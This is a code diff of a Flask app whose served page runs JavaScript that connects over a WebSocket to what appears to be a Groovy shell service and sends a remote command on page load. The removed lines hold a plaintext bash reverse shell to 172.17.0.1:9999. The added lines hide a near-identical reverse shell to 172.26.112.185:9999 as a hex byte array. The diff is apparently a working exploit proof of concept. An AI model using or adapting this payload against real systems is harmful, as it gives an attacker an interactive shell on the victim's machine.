@@ -24,47 +24,38 @@ def index():
             ws.onopen = function() {
                 console.log("Connected");
 
-                const command = new TextEncoder().encode("groovy"); // Convert string to byte array (Uint8Array)
-                console.log(command);
-
                 // Define the start and end frames
-                const start = new Uint8Array([0x00, 0x00, 0x06]);   // last byte needs to match length of command
-                const end = new Uint8Array([0x00, 0x00, 0x01, 0x3d, 0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);
+                const command_hex = new Uint8Array([
+                0x00, 0x00, 0x63, 0x5b, 0x27, 0x62, 0x61, 0x73, 0x68, 0x27, 0x2c, 0x20, 0x27, 0x2d, 0x63, 0x27,
+                0x2c, 0x20, 0x27, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x63, 0x20,
+                0x5c, 0x27, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x69, 0x20, 0x3e, 0x26, 0x20, 0x2f, 0x64, 0x65,
+                0x76, 0x2f, 0x74, 0x63, 0x70, 0x2f, 0x31, 0x37, 0x32, 0x2e, 0x32, 0x36, 0x2e, 0x31, 0x31, 0x32,
+                0x2e, 0x31, 0x38, 0x35, 0x2f, 0x39, 0x39, 0x39, 0x39, 0x20, 0x30, 0x3e, 0x26, 0x31, 0x5c, 0x27,
+                0x27, 0x5d, 0x2e, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x28, 0x29, 0x2e, 0x77, 0x61, 0x69,
+                0x74, 0x46, 0x6f, 0x72, 0x28, 0x29
+                ]);
 
-                // Combine the start, command, and end frames into one frame
-                const commandFrame = new Uint8Array(start.length + command.length + end.length);
-                commandFrame.set(start);
-                commandFrame.set(command, start.length);
-                commandFrame.set(end, start.length + command.length);
+                ws.send(new Uint8Array([0x00, 0x00, 0x08, 0x67, 0x72, 0x6f, 0x6f, 0x76, 0x79, 0x73, 0x68]));
+                console.log("Start signal sent");
 
-                // Send the command frame as a binary message
-                ws.send(commandFrame);
+                ws.send(command_hex);
                 console.log("Command sent");
+
+                ws.send(new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38]));
+
+                ws.send(new Uint8Array([0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]));
 
                 // Send the start signal (0x03) as a separate binary frame
                 ws.send(new Uint8Array([0x03]));
                 console.log("Start signal sent");
-                
-                const start_script = new Uint8Array([0x05]); 
-                const script = new TextEncoder().encode("['bash', '-c', 'bash -i >& /dev/tcp/172.17.0.1/9999 0>&1'].execute()"); // Convert string to byte array (Uint8Array)
-                console.log(script);
-                const end_script = new Uint8Array([0x06]); 
-                
-                const scriptFrame = new Uint8Array(start_script.length + script.length + end_script.length);
-                scriptFrame.set(start_script);
-                scriptFrame.set(script, start_script.length);
-                scriptFrame.set(end_script, start_script.length + script.length);
-                
-                ws.send(scriptFrame);
-                console.log("Script sent");
-                
+
                 // Start listening for responses
                 let i = 0;
                 ws.onmessage = function(event) {
                     // Decode the response if it's in binary format (assuming UTF-8 encoded text)
                     const decoder = new TextDecoder('utf-8');
                     const decodedMessage = decoder.decode(event.data);
-                    
+
                     // Print the decoded message to the console
                     console.log(`Message ${i}: ${decodedMessage}`);
                     i += 1;
@@ -88,7 +79,7 @@ def index():
     </body>
     </html>
     """
-    
+
     # Render the HTML content as the response
     return render_template_string(html_content)
 
